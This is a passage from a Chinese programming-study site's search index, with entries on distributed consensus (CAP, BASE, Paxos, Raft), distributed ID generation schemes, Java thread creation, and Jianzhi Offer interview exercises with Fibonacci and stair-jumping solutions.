在提交阶段，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。\n2.4 太过保守    任意一个节点失败就会导致整个事务失败，没有完善的容错机制。\n本地消息表    本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。\n 在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。  \n三、CAP    分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。\n\n一致性    一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。\n对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。\n可用性    可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。\n在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。\n分区容忍性    网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。\n在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。\n权衡    在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。\n可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，\n 为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性； 为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。  四、BASE    BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。\nBASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。\n基本可用    指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。\n例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。\n软状态    指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。\n最终一致性    最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。\nACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。\n在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。\n五、Paxos    用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。\n主要有三类节点：\n 提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。  \n执行过程    规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。\n1. Prepare 阶段    下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。\n\n当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。\n如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。\n\n如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 \u0026gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。\n如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n \u0026gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 \u0026lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。\n\n2. Accept 阶段    当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。\nProposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。\nProposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。\n\n3. Learn 阶段    Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。\n\n约束条件    1. 正确性    指只有一个提议值会生效。\n因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。\n2. 可终止性    指最后总会有一个提议生效。\nPaxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。\n六、Raft    Raft 也是分布式一致性协议，主要是用来竞选主节点。\n Raft: Understandable Distributed Consensus  单个 Candidate 的竞选    有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。\n 下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。  \n 此时 Node A 发送投票请求给其它所有节点。  \n 其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。  \n 之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。  \n多个 Candidate 竞选     如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。  \n 由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。  \n数据同步     来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。  \n Leader 会把修改复制到所有 Follower。  \n Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。  \n 此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。  \n参考     倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015. Distributed locks with Redis 浅谈分布式锁 基于 Zookeeper 的分布式锁 聊聊分布式事务，再说说解决方案 分布式系统的事务处理 深入理解分布式事务 What is CAP theorem in distributed database system? NEAT ALGORITHMS - PAXOS Paxos By Example  "},{"id":332,"href":"/system-design/distributed/%E5%88%86%E5%B8%83%E5%BC%8FID/","title":"分布式ID","parent":"distributed","content":"分布式 ID    何为 ID？    日常开发中，我们需要对系统中的各种数据使用 ID 唯一表示，比如用户 ID 对应且仅对应一个人，商品 ID 对应且仅对应一件商品，订单 ID 对应且仅对应一个订单。\n我们现实生活中也有各种 ID，比如身份证 ID 对应且仅对应一个人、地址 ID 对应且仅对应\n简单来说，ID 就是数据的唯一标识。\n何为分布式 ID？    分布式 ID 是分布式系统下的 ID。分布式 ID 不存在与现实生活中，属于计算机系统中的一个概念。\n我简单举一个分库分表的例子。\n我司的一个项目，使用的是单机 MySQL 。但是，没想到的是，项目上线一个月之后，随着使用人数越来越多，整个系统的数据量将越来越大。\n单机 MySQL 已经没办法支撑了，需要进行分库分表（推荐 Sharding-JDBC）。\n在分库之后， 数据遍布在不同服务器上的数据库，数据库的自增主键已经没办法满足生成的主键唯一了。我们如何为不同的数据节点生成全局唯一主键呢？\n这个时候就需要生成分布式 ID了。\n分布式 ID 需要满足哪些要求?    分布式 ID 作为分布式系统中必不可少的一环，很多地方都要用到分布式 ID。\n一个最基本的分布式 ID 需要满足下面这些要求：\n 全局唯一 ：ID 的全局唯一性肯定是首先要满足的！ 高性能 ： 分布式 ID 的生成速度要快，对本地资源消耗要小。 高可用 ：生成分布式 ID 的服务要保证可用性无限接近于 100%。 方便易用 ：拿来即用，使用方便，快速接入！  除了这些之外，一个比较好的分布式 ID 还应保证：\n 安全 ：ID 中不包含敏感信息。 有序递增 ：如果要把 ID 存放在数据库的话，ID 的有序性可以提升数据库写入速度。并且，很多时候 ，我们还很有可能会直接通过 ID 来进行排序。 有具体的业务含义 ：生成的 ID 如果能有具体的业务含义，可以让定位问题以及开发更透明化（通过 ID 就能确定是哪个业务）。 独立部署 ：也就是分布式系统单独有一个发号器服务，专门用来生成分布式 ID。这样就生成 ID 的服务可以和业务相关的服务解耦。不过，这样同样带来了网络调用消耗增加的问题。总的来说，如果需要用到分布式 ID 的场景比较多的话，独立部署的发号器服务还是很有必要的。  分布式 ID 常见解决方案    数据库    数据库主键自增    这种方式就比较简单直白了，就是通过关系型数据库的自增主键产生来唯一的 ID。\n以 MySQL 举例，我们通过下面的方式即可。\n1.创建一个数据库表。\nCREATE TABLE `sequence_id` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `stub` char(10) NOT NULL DEFAULT \u0026#39;\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `stub` (`stub`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; stub 字段无意义，只是为了占位，便于我们插入或者修改数据。并且，给 stub 字段创建了唯一索引，保证其唯一性。\n2.通过 replace into 来插入数据。\nBEGIN; REPLACE INTO sequence_id (stub) VALUES (\u0026#39;stub\u0026#39;); SELECT LAST_INSERT_ID(); COMMIT; 插入数据这里，我们没有使用 insert into 而是使用 replace into 来插入数据，具体步骤是这样的：\n1)第一步： 尝试把数据插入到表中。\n2)第二步： 如果主键或唯一索引字段出现重复数据错误而插入失败时，先从表中删除含有重复关键字值的冲突行，然后再次尝试把数据插入到表中。\n这种方式的优缺点也比较明显：\n 优点 ：实现起来比较简单、ID 有序递增、存储消耗空间小 缺点 ： 支持的并发量不大、存在数据库单点问题（可以使用数据库集群解决，不过增加了复杂度）、ID 没有具体业务含义、安全问题（比如根据订单 ID 的递增规律就能推算出每天的订单量，商业机密啊！ ）、每次获取 ID 都要访问一次数据库（增加了对数据库的压力，获取速度也慢）  数据库号段模式    数据库主键自增这种模式，每次获取 ID 都要访问一次数据库，ID 需求比较大的时候，肯定是不行的。\n如果我们可以批量获取，然后存在在内存里面，需要用到的时候，直接从内存里面拿就舒服了！这也就是我们说的 基于数据库的号段模式来生成分布式 ID。\n数据库的号段模式也是目前比较主流的一种分布式 ID 生成方式。像滴滴开源的Tinyid 就是基于这种方式来做的。不过，TinyId 使用了双号段缓存、增加多 db 支持等方式来进一步优化。\n以 MySQL 举例，我们通过下面的方式即可。\n1.创建一个数据库表。\nCREATE TABLE `sequence_id_generator` ( `id` int(10) NOT NULL, `current_max_id` bigint(20) NOT NULL COMMENT \u0026#39;当前最大id\u0026#39;, `step` int(10) NOT NULL COMMENT \u0026#39;号段的长度\u0026#39;, `version` int(20) NOT NULL COMMENT \u0026#39;版本号\u0026#39;, `biz_type` int(20) NOT NULL COMMENT \u0026#39;业务类型\u0026#39;, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; current_max_id 字段和step字段主要用于获取批量 ID，获取的批量 id 为： current_max_id ~ current_max_id+step。\nversion 字段主要用于解决并发问题（乐观锁）,biz_type 主要用于表示业余类型。\n2.先插入一行数据。\nINSERT INTO `sequence_id_generator` (`id`, `current_max_id`, `step`, `version`, `biz_type`) VALUES (1, 0, 100, 0, 101); 3.通过 SELECT 获取指定业务下的批量唯一 ID\nSELECT `current_max_id`, `step`,`version` FROM `sequence_id_generator` where `biz_type` = 101 结果：\nid\tcurrent_max_id\tstep\tversion\tbiz_type 1\t0\t100\t1\t101 4.不够用的话，更新之后重新 SELECT 即可。\nUPDATE sequence_id_generator SET current_max_id = 0+100, version=version+1 WHERE version = 0 AND `biz_type` = 101 SELECT `current_max_id`, `step`,`version` FROM `sequence_id_generator` where `biz_type` = 101 结果：\nid\tcurrent_max_id\tstep\tversion\tbiz_type 1\t100\t100\t1\t101 相比于数据库主键自增的方式，数据库的号段模式对于数据库的访问次数更少，数据库压力更小。\n另外，为了避免单点问题，你可以从使用主从模式来提高可用性。\n数据库号段模式的优缺点:\n 优点 ：ID 有序递增、存储消耗空间小 缺点 ：存在数据库单点问题（可以使用数据库集群解决，不过增加了复杂度）、ID 没有具体业务含义、安全问题（比如根据订单 ID 的递增规律就能推算出每天的订单量，商业机密啊！ ）  NoSQL    一般情况下，NoSQL 方案使用 Redis 多一些。我们通过 Redis 的 incr 命令即可实现对 id 原子顺序递增。\n127.0.0.1:6379\u0026gt; set sequence_id_biz_type 1 OK 127.0.0.1:6379\u0026gt; incr sequence_id_biz_type (integer) 2 127.0.0.1:6379\u0026gt; get sequence_id_biz_type \u0026#34;2\u0026#34; 为了提高可用性和并发，我们可以使用 Redis Cluser。Redis Cluser 是 Redis 官方提供的 Redis 集群解决方案（3.0+版本）。\n除了 Redis Cluser 之外，你也可以使用开源的 Redis 集群方案Codis （大规模集群比如上百个节点的时候比较推荐）。\n除了高可用和并发之外，我们知道 Redis 基于内存，我们需要持久化数据，避免重启机器或者机器故障后数据丢失。Redis 支持两种不同的持久化方式：快照（snapshotting，RDB）、只追加文件（append-only file, AOF）。 并且，Redis 4.0 开始支持 RDB 和 AOF 的混合持久化（默认关闭，可以通过配置项 aof-use-rdb-preamble 开启）。\n关于 Redis 持久化，我这里就不过多介绍。不了解这部分内容的小伙伴，可以看看 JavaGuide 对于 Redis 知识点的总结。\nRedis 方案的优缺点：\n 优点 ： 性能不错并且生成的 ID 是有序递增的 缺点 ： 和数据库主键自增方案的缺点类似  除了 Redis 之外，MongoDB ObjectId 经常也会被拿来当做分布式 ID 的解决方案。\nMongoDB ObjectId 一共需要 12 个字节存储：\n 0~3：时间戳 3~6： 代表机器 ID 7~8：机器进程 ID 9~11 ：自增值  MongoDB 方案的优缺点：\n 优点 ： 性能不错并且生成的 ID 是有序递增的 缺点 ： 需要解决重复 ID 问题（当机器时间不对的情况下，可能导致会产生重复 ID） 、有安全性问题（ID 生成有规律性）  算法    UUID    UUID 是 Universally Unique Identifier（通用唯一标识符） 的缩写。UUID 包含 32 个 16 进制数字（8-4-4-4-12）。\nJDK 就提供了现成的生成 UUID 的方法，一行代码就行了。\n//输出示例：cb4a9ede-fa5e-4585-b9bb-d60bce986eaa UUID.randomUUID() RFC 4122 中关于 UUID 的示例是这样的：\n我们这里重点关注一下这个 Version(版本)，不同的版本对应的 UUID 的生成规则是不同的。\n5 种不同的 Version(版本)值分别对应的含义（参考维基百科对于 UUID 的介绍）：\n 版本 1 : UUID 是根据时间和节点 ID（通常是 MAC 地址）生成； 版本 2 : UUID 是根据标识符（通常是组或用户 ID）、时间和节点 ID 生成； 版本 3、版本 5 : 版本 5 - 确定性 UUID 通过散列（hashing）名字空间（namespace）标识符和名称生成； 版本 4 : UUID 使用随机性或伪随机性生成。  下面是 Version 1 版本下生成的 UUID 的示例：\nJDK 中通过 UUID 的 randomUUID() 方法生成的 UUID 的版本默认为 4。\nUUID uuid = UUID.randomUUID(); int version = uuid.version();// 4 另外，Variant(变体)也有 4 种不同的值，这种值分别对应不同的含义。这里就不介绍了，貌似平时也不怎么需要关注。\n需要用到的时候，去看看维基百科对于 UUID 的 Variant(变体) 相关的介绍即可。\n从上面的介绍中可以看出，UUID 可以保证唯一性，因为其生成规则包括 MAC 地址、时间戳、名字空间（Namespace）、随机或伪随机数、时序等元素，计算机基于这些规则生成的 UUID 是肯定不会重复的。\n虽然，UUID 可以做到全局唯一性，但是，我们一般很少会使用它。\n比如使用 UUID 作为 MySQL 数据库主键的时候就非常不合适：\n 数据库主键要尽量越短越好，而 UUID 的消耗的存储空间比较大（32 个字符串，128 位）。 UUID 是无顺序的，InnoDB 引擎下，数据库主键的无序性会严重影响数据库性能。  最后，我们再简单分析一下 UUID 的优缺点 （面试的时候可能会被问到的哦！） :\n 优点 ：生成速度比较快、简单易用 缺点 ： 存储消耗空间大（32 个字符串，128 位） 、 不安全（基于 MAC 地址生成 UUID 的算法会造成 MAC 地址泄露)、无序（非自增）、没有具体业务含义、需要解决重复 ID 问题（当机器时间不对的情况下，可能导致会产生重复 ID）  Snowflake(雪花算法)    Snowflake 是 Twitter 开源的分布式 ID 生成算法。Snowflake 由 64 bit 的二进制数字组成，这 64bit 的二进制被分成了几部分，每一部分存储的数据都有特定的含义：\n 第 0 位： 符号位（标识正负），始终为 0，没有用，不用管。 第 1~41 位 ：一共 41 位，用来表示时间戳，单位是毫秒，可以支撑 2 ^41 毫秒（约 69 年） 第 42~52 位 ：一共 10 位，一般来说，前 5 位表示机房 ID，后 5 位表示机器 ID（实际项目中可以根据实际情况调整）。这样就可以区分不同集群/机房的节点。 第 53~64 位 ：一共 12 位，用来表示序列号。 序列号为自增值，代表单台机器每毫秒能够产生的最大 ID 数(2^12 = 4096),也就是说单台机器每毫秒最多可以生成 4096 个 唯一 ID。  如果你想要使用 Snowflake 算法的话，一般不需要你自己再造轮子。有很多基于 Snowflake 算法的开源实现比如美团 的 Leaf、百度的 UidGenerator，并且这些开源实现对原有的 Snowflake 算法进行了优化。\n另外，在实际项目中，我们一般也会对 Snowflake 算法进行改造，最常见的就是在 Snowflake 算法生成的 ID 中加入业务类型信息。\n我们再来看看 Snowflake 算法的优缺点 ：\n 优点 ：生成速度比较快、生成的 ID 有序递增、比较灵活（可以对 Snowflake 算法进行简单的改造比如加入业务 ID） 缺点 ： 需要解决重复 ID 问题（依赖时间，当机器时间不对的情况下，可能导致会产生重复 ID）。  开源框架    UidGenerator(百度)    UidGenerator 是百度开源的一款基于 Snowflake(雪花算法)的唯一 ID 生成器。\n不过，UidGenerator 对 Snowflake(雪花算法)进行了改进，生成的唯一 ID 组成如下。\n可以看出，和原始 Snowflake(雪花算法)生成的唯一 ID 的组成不太一样。并且，上面这些参数我们都可以自定义。\nUidGenerator 官方文档中的介绍如下：\n自 18 年后，UidGenerator 就基本没有再维护了，我这里也不过多介绍。想要进一步了解的朋友，可以看看 UidGenerator 的官方介绍。\nLeaf(美团)    Leaf 是美团开源的一个分布式 ID 解决方案 。这个项目的名字 Leaf（树叶） 起源于德国哲学家、数学家莱布尼茨的一句话： “There are no two identical leaves in the world”（世界上没有两片相同的树叶） 。这名字起得真心挺不错的，有点文艺青年那味了！\nLeaf 提供了 号段模式 和 Snowflake(雪花算法) 这两种模式来生成分布式 ID。并且，它支持双号段，还解决了雪花 ID 系统时钟回拨问题。不过，时钟问题的解决需要弱依赖于 Zookeeper 。\nLeaf 的诞生主要是为了解决美团各个业务线生成分布式 ID 的方法多种多样以及不可靠的问题。\nLeaf 对原有的号段模式进行改进，比如它这里增加了双号段避免获取 DB 在获取号段的时候阻塞请求获取 ID 的线程。简单来说，就是我一个号段还没用完之前，我自己就主动提前去获取下一个号段（图片来自于美团官方文章：《Leaf——美团点评分布式 ID 生成系统》）。\n根据项目 README 介绍，在 4C8G VM 基础上，通过公司 RPC 方式调用，QPS 压测结果近 5w/s，TP999 1ms。\nTinyid(滴滴)    Tinyid 是滴滴开源的一款基于数据库号段模式的唯一 ID 生成器。\n数据库号段模式的原理我们在上面已经介绍过了。Tinyid 有哪些亮点呢？\n为了搞清楚这个问题，我们先来看看基于数据库号段模式的简单架构方案。（图片来自于 Tinyid 的官方 wiki:《Tinyid 原理介绍》）\n在这种架构模式下，我们通过 HTTP 请求向发号器服务申请唯一 ID。负载均衡 router 会把我们的请求送往其中的一台 tinyid-server。\n这种方案有什么问题呢？在我看来（Tinyid 官方 wiki 也有介绍到），主要由下面这 2 个问题：\n 获取新号段的情况下，程序获取唯一 ID 的速度比较慢。 需要保证 DB 高可用，这个是比较麻烦且耗费资源的。  除此之外，HTTP 调用也存在网络开销。\nTinyid 的原理比较简单，其架构如下图所示：\n相比于基于数据库号段模式的简单架构方案，Tinyid 方案主要做了下面这些优化：\n 双号段缓存 ：为了避免在获取新号段的情况下，程序获取唯一 ID 的速度比较慢。 Tinyid 中的号段在用到一定程度的时候，就会去异步加载下一个号段，保证内存中始终有可用号段。 增加多 db 支持 ：支持多个 DB，并且，每个 DB 都能生成唯一 ID，提高了可用性。 增加 tinyid-client ：纯本地操作，无 HTTP 请求消耗，性能和可用性都有很大提升。  Tinyid 的优缺点这里就不分析了，结合数据库号段模式的优缺点和 Tinyid 的原理就能知道。\n分布式 ID 生成方案总结    这篇文章中，我基本上已经把最常见的分布式 ID 生成方案都总结了一波。\n除了上面介绍的方式之外，像 ZooKeeper 这类中间件也可以帮助我们生成唯一 ID。没有银弹，一定要结合实际项目来选择最适合自己的方案。\n"},{"id":333,"href":"/java/multi-thread/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/","title":"创建线程的几种方式总结","parent":"multi-thread","content":"面试官：“创建线程有哪几种常见的方式？”     继承 Thread 类 实现 Runnable 接口 使用 Executor 框架 使用 FutureTask  最简单的两种方式    1.继承 Thread 类    2.实现 Runnable 接口    比较实用的两种方式    3.使用 Executor 框架    Executor 框架是 Java5 之后引进的，在 Java 5 之后，通过 Executor 来启动线程比使用 Thread 的 start 方法更好，除了更易管理，效率更好（用线程池实现，节约开销）外，还有关键的一点：有助于避免 this 逃逸问题。\n 补充：this 逃逸是指在构造函数返回之前其他线程就持有该对象的引用. 调用尚未构造完全的对象的方法可能引发令人疑惑的错误。\n Executor 框架不仅包括了线程池的管理，还提供了线程工厂、队列以及拒绝策略等，Executor 框架让并发编程变得更加简单。\n为了能搞懂如何使用 Executor 框架创建\nExecutor 框架结构(主要由三大部分组成)    1) 任务(Runnable /Callable)    执行任务需要实现的 Runnable 接口 或 Callable接口。Runnable 接口或 Callable 接口 实现类都可以被 ThreadPoolExecutor 或 ScheduledThreadPoolExecutor 执行。\n2) 任务的执行(Executor)    如下图所示，包括任务执行机制的核心接口 Executor ，以及继承自 Executor 接口的 ExecutorService 接口。ThreadPoolExecutor 和 ScheduledThreadPoolExecutor 这两个关键类实现了 ExecutorService 接口。\n4.使用 FutureTask    "},{"id":334,"href":"/%E7%AC%94%E8%AE%B0/%E5%89%91%E6%8C%87%E5%89%91%E6%8C%87-offer-%E9%A2%98%E8%A7%A3/","title":"剑指 offer 题解","parent":"笔记","content":"剑指 Offer 题解\n"},{"id":335,"href":"/%E7%AC%94%E8%AE%B0/%E5%89%91%E6%8C%87%E5%89%91%E6%8C%87-Offer-%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95/","title":"剑指 Offer 题解 - 目录","parent":"笔记","content":"剑指 Offer 题解    前言    题目来自《何海涛. 剑指 Offer[M]. 电子工业出版社, 2012.》，刷题网站推荐：\n 牛客网 Leetcode  数组与矩阵     3. 数组中重复的数字 4. 二维数组中的查找 5. 替换空格 29. 顺时针打印矩阵 50. 第一个只出现一次的字符位置  栈队列堆     9. 用两个栈实现队列 30. 包含 min 函数的栈 31. 栈的压入、弹出序列 40. 最小的 K 个数 41.1 数据流中的中位数 41.2 字符流中第一个不重复的字符 59. 滑动窗口的最大值  双指针     57.1 和为 S 的两个数字 57.2 和为 S 的连续正数序列 58.1 翻转单词顺序列 58.2 左旋转字符串  链表     6. 从尾到头打印链表 18.1 在 O(1) 时间内删除链表节点 18.2 删除链表中重复的结点 22. 链表中倒数第 K 个结点 23. 链表中环的入口结点 24. 反转链表 25. 合并两个排序的链表 35. 复杂链表的复制 52. 两个链表的第一个公共结点  树     7. 重建二叉树 8. 二叉树的下一个结点 26. 树的子结构 27. 二叉树的镜像 28. 对称的二叉树 32.1 从上往下打印二叉树 32.2 把二叉树打印成多行 32.3 按之字形顺序打印二叉树 33. 二叉搜索树的后序遍历序列 34. 二叉树中和为某一值的路径 36. 二叉搜索树与双向链表 37. 序列化二叉树 54. 二叉查找树的第 K 个结点 55.1 二叉树的深度 55.2 平衡二叉树 68. 树中两个节点的最低公共祖先  贪心思想     14. 剪绳子 63. 股票的最大利润  二分查找     11. 旋转数组的最小数字 53. 数字在排序数组中出现的次数  分治     16. 数值的整数次方  搜索     12. 矩阵中的路径 13. 机器人的运动范围 38. 字符串的排列  排序     21. 调整数组顺序使奇数位于偶数前面 45. 把数组排成最小的数 51. 数组中的逆序对  动态规划     10.1 斐波那契数列 10.2 矩形覆盖 10.3 跳台阶 10.4 变态跳台阶 42. 连续子数组的最大和 47. 礼物的最大价值 48. 最长不含重复字符的子字符串 49. 丑数 60. n 个骰子的点数 66. 构建乘积数组  数学     39. 数组中出现次数超过一半的数字 62. 圆圈中最后剩下的数 43. 从 1 到 n 整数中 1 出现的次数  位运算     15. 二进制中 1 的个数 56. 数组中只出现一次的数字  其它     17. 打印从 1 到最大的 n 位数 19. 正则表达式匹配 20. 表示数值的字符串 44. 数字序列中的某一位数字 46. 把数字翻译成字符串 61. 扑克牌顺子 64. 求 1+2+3+\u0026hellip;+n 65. 不用加减乘除做加法 67. 把字符串转换成整数  "},{"id":336,"href":"/cs-basics/algorithms/%E5%89%91%E6%8C%87offer%E9%83%A8%E5%88%86%E7%BC%96%E7%A8%8B%E9%A2%98/","title":"剑指offer部分编程题","parent":"algorithms","content":"一 斐波那契数列    题目描述：    大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项。 n\u0026lt;=39\n问题分析：    可以肯定的是这一题通过递归的方式是肯定能做出来，但是这样会有一个很大的问题，那就是递归大量的重复计算会导致内存溢出。另外可以使用迭代法，用fn1和fn2保存计算过程中的结果，并复用起来。下面我会把两个方法示例代码都给出来并给出两个方法的运行时间对比。\n示例代码：    采用迭代法：\nint Fibonacci(int number) { if (number \u0026lt;= 0) { return 0; } if (number == 1 || number == 2) { return 1; } int first = 1, second = 1, third = 0; for (int i = 3; i \u0026lt;= number; i++) { third = first + second; first = second; second = third; } return third; } 采用递归：\npublic int Fibonacci(int n) { if (n \u0026lt;= 0) { return 0; } if (n == 1||n==2) { return 1; } return Fibonacci(n - 2) + Fibonacci(n - 1); } 二 跳台阶问题    题目描述：    一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。\n问题分析：    正常分析法： a.如果两种跳法，1阶或者2阶，那么假定第一次跳的是一阶，那么剩下的是n-1个台阶，跳法是f(n-1); b.假定第一次跳的是2阶，那么剩下的是n-2个台阶，跳法是f(n-2) c.由a，b假设可以得出总跳法为: f(n) = f(n-1) + f(n-2) d.然后通过实际的情况可以得出：只有一阶的时候 f(1) = 1 ,只有两阶的时候可以有 f(2) = 2 找规律分析法： f(1) = 1, f(2) = 2, f(3) = 3, f(4) = 5， 可以总结出f(n) = f(n-1) + f(n-2)的规律。 但是为什么会出现这样的规律呢？假设现在6个台阶，我们可以从第5跳一步到6，这样的话有多少种方案跳到5就有多少种方案跳到6，另外我们也可以从4跳两步跳到6，跳到4有多少种方案的话，就有多少种方案跳到6，其他的不能从3跳到6什么的啦，所以最后就是f(6) = f(5) + f(4)；这样子也很好理解变态跳台阶的问题了。\n所以这道题其实就是斐波那契数列的问题。 代码只需要在上一题的代码稍做修改即可。和上一题唯一不同的就是这一题的初始元素变为 1 2 3 5 8\u0026hellip;..而上一题为1 1 2 3 5 \u0026hellip;\u0026hellip;.。另外这一题也可以用递归做，但是递归效率太低，所以我这里只给出了迭代方式的代码。\n示例代码：    int jumpFloor(int number) { if (number \u0026lt;= 0) { return 0; } if (number == 1) { return 1; } if (number == 2) { return 2; } int first = 1, second = 2, third = 0; for (int i = 3; i \u0026lt;= number; i++) { third = first + second; first = second; second = third; } return third; } 三 变态跳台阶问题    题目描述：    一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。\n问题分析：    假设n\u0026gt;=2，第一步有n种跳法：跳1级、跳2级、到跳n级 跳1级，剩下n-1级，则剩下跳法是f(n-1) 跳2级，剩下n-2级，则剩下跳法是f(n-2) \u0026hellip;\u0026hellip; 跳n-1级，剩下1级，则剩下跳法是f(1) 跳n级，剩下0级，则剩下跳法是f(0) 所以在n\u0026gt;=2的情况下： f(n)=f(n-1)+f(n-2)+\u0026hellip;+f(1) 因为f(n-1)=f(n-2)+f(n-3)+\u0026hellip;+f(1) 所以f(n)=2*f(n-1) 又f(1)=1,所以可得f(n)=2^(number-1)\n示例代码：    int JumpFloorII(int number) { return 1 \u0026lt;\u0026lt; --number;//2^(number-1)用位移操作进行，更快 } 补充：    java中有三种移位运算符：\n “\u0026laquo;” : 左移运算符，等同于乘2的n次方 “\u0026raquo;”: 右移运算符，等同于除2的n次方 “\u0026raquo;\u0026gt;” : 